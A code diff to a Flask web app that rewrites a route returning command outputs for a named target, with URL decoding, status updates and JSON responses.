@@ -39,8 +39,9 @@ It uses SQLAlchemy for database interactions and JSON files for data storage.
             - Users can view and update their settings.
 """
 
-from flask import render_template, url_for, Blueprint, request, session, flash, redirect
+from flask import render_template, url_for, Blueprint, request, session, flash, redirect, jsonify
 from sqlalchemy.orm import sessionmaker
+from urllib.parse import unquote
 
 from db.modle import Users, APICommand, APILink, Targets, Instraction, ApiToken
 from db.mange_db import config, _create_engine
@@ -147,37 +148,94 @@ def api_command(targetName=None):
         return redirect(url_for("public.login"))
 
 
-@view.route('/check_commads_updates/<target_name>', methods=['GET'])
-def check_commads_updates(target_name):
-    """
+@view.route('/check_command_update/<target_name>', methods=['GET'])
+def check_command_update(target_name):
+    '''
     Check for updates to API commands for a given target.
-    Returns new commands and their output if available.
+    This route checks if any commands for the specified target have been updated.
+    It retrieves the commands from the database and checks their update status.
+    Returns a JSON response with the updated commands or a message if no updates are found.
+    Only accessible to authenticated users.
     Redirects to login if the user is not authenticated.
-    """
-    if "email" in session:
-        try:
-            cmd_rows = _session.query(APICommand).filter_by(
-                target_name=target_name,
-                condition=config.STUTAS[0]  # Active commands
-            ).all()
-
-            if cmd_rows:
-                payload = [{'cmd': row.cmd, 'id': row.ID, 'output': readFromJson('output',target_name)[row.ID]} for row in cmd_rows]
-                return {'event': 'new_message', 'payload': payload}, 200
-            else:
-                return {'payload': []}, 200
-
-        except Exception as e:
-            log(f'[ERROR ROUTE] : {request.endpoint} error: {e}')
-            _session.rollback()
-            return {'error': 'Server side Error'}, 500
-
-        finally:
-            _session.close()
-    else:
-        flash("you must login first")
+    Usage:
+        GET /check_command_update/<target_name>
+    Parameters:
+        target_name (str): The name of the target for which to check command updates.
+    Returns:
+        JSON response with updated commands or a message indicating no updates.
+    Example response:
+        {
+            "message": "Commands checked successfully",
+            "updated_commands": [
+                {
+                    ("command_output","command_id")
+                }
+            ]
+        }
+        or
+        {
+            "message": "No commands to check for updates"
+        }
+    Error handling:
+        If an error occurs during the process, it logs the error and returns a 500 status code with an error message.
+        If the user is not authenticated, it redirects to the login page.
+    Usage example:
+        curl -X GET http://example.com/check_command_update/my_target
+    Note:
+        This route requires the user to be logged in. If the user is not authenticated, they will be redirected to the login page.
+        The target_name parameter should match the name of a target.
+    '''
+    if "email" not in session:
+        flash("You must login first")
         return redirect(url_for("public.login"))
 
+    try:
+        decoded_target = unquote(target_name)  # Handle special characters like ":"
+        cmd_rows = _session.query(APICommand).filter_by(
+            target_name=decoded_target,
+            condition=config.STUTAS[0]  # "Active" or "Pending" commands
+        ).all()
+
+        updated_commands = []
+
+        if cmd_rows:
+            outputs = readFromJson('output', decoded_target)  # Read output JSON once
+            print(f'[DEBUG] Outputs for {decoded_target}: {outputs}')
+
+            for cmd in cmd_rows:
+                print(f'[DEBUG] Processing command: {cmd.ID}, update status: {cmd.update}')
+                if cmd.update == 'notYet':
+                    if cmd.ID in outputs:
+                        cmd.update = config.CHECK_UPDATE[0]  # e.g., "checked"
+                        updated_commands.append((
+                            outputs[cmd.ID],  # Command output
+                            cmd.ID  # Command ID
+                        ))
+                        _session.query(APICommand).filter_by(ID=cmd.ID).update({
+                            'update': config.CHECK_UPDATE[0]  # Update status to "checked"
+                        })
+
+            _session.commit()  # Commit updates only once after processing all
+        elif len(cmd_rows) == 0:
+            return jsonify({
+                "message": "No commands to check for updates",
+                "detail": "No matching active commands found",
+                "updated_commands": []
+            }), 200
+
+        return jsonify({
+            "message": "Commands checked successfully",
+            "detail": f"Updated commands found: {len(updated_commands)}",
+            "updated_commands": updated_commands
+        }), 200
+
+    except Exception as e:
+        log(f'[ERROR ROUTE] : {request.endpoint} -> {e}')
+        _session.rollback()
+        return jsonify({'error': 'Server side error'}), 500
+
+    finally:
+        _session.close()
 
 @view.route('/api_command/delete',methods=['DELETE'])
 def delete_command():
